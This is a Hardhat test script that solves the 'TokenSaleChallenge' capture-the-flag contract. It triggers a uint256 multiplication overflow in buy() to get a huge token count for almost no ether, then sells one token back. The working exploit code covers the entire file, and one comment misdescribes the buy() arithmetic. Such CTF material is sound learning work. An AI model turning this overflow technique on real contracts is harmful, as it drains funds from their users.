import { ethers } from "hardhat";
import { expect } from "chai";
import { BigNumber } from "ethers";

describe("TokenSaleChallenge", function () {
  it("should exploit integer overflow in buy()", async function () {
    const [attacker] = await ethers.getSigners();

    // Step 1: Deploy the challenge contract with 1 ether as initial balance
    const ChallengeFactory = await ethers.getContractFactory("TokenSaleChallenge");
    const challenge = await ChallengeFactory.connect(attacker).deploy(attacker.address, {
      value: ethers.utils.parseEther("1.0"),
    });

    // --------------------------
    // Vulnerability Explanation:
    // --------------------------
    //
    // The challenge contract has a buy() function which calculates:
    //    tokensBought = msg.value / 1 ether
    // But it does NOT properly validate overflows in internal arithmetic.
    //
    // Since msg.value and the price (1 ether) are both uint256, we can cause an overflow
    // in the multiplication inside buy() by choosing a `tokenAmount` such that:
    //    tokenAmount * price > uint256 max
    //
    // If we pick tokenAmount = (2^256 / price) + 1, the multiplication will overflow
    // and wrap back around, resulting in a very small value being charged for a large number of tokens.
    //
    // We then sell back just 1 token to receive 1 ether and pass the challenge.

    const PRICE_PER_TOKEN = ethers.utils.parseEther("1"); // 1 token = 1 ether
    const UINT256_MAX = BigNumber.from(2).pow(256); // 2^256

    // Step 2: Carefully crafted token amount to force overflow
    const toBuy = UINT256_MAX.div(PRICE_PER_TOKEN).add(1);

    // This will overflow internally in the contract and effectively charge near-zero ETH
    const toPay = toBuy.mul(PRICE_PER_TOKEN).mod(UINT256_MAX);

    console.log("Exploiting buy()");
    console.log("Tokens to buy (overflowed):", toBuy.toString());
    console.log("ETH to pay (due to overflow):", toPay.toString());

    // Step 3: Exploit - Buy a huge amount of tokens with effectively 0 ETH
    const buyTx = await challenge.buy(toBuy, {
      value: toPay,
    });
    await buyTx.wait();
    console.log("Overflowed buy() executed");

    // Step 4: Sell only 1 token back to receive 1 ETH profit
    const sellTx = await challenge.sell(1);
    await sellTx.wait();
    console.log("Sold 1 token for 1 ETH");

    // Step 5: Validate that the challenge is now solved
    const isComplete = await challenge.isComplete();
    expect(isComplete).to.be.true;
    console.log("Challenge successfully solved via integer overflow in buy()");
  });
});
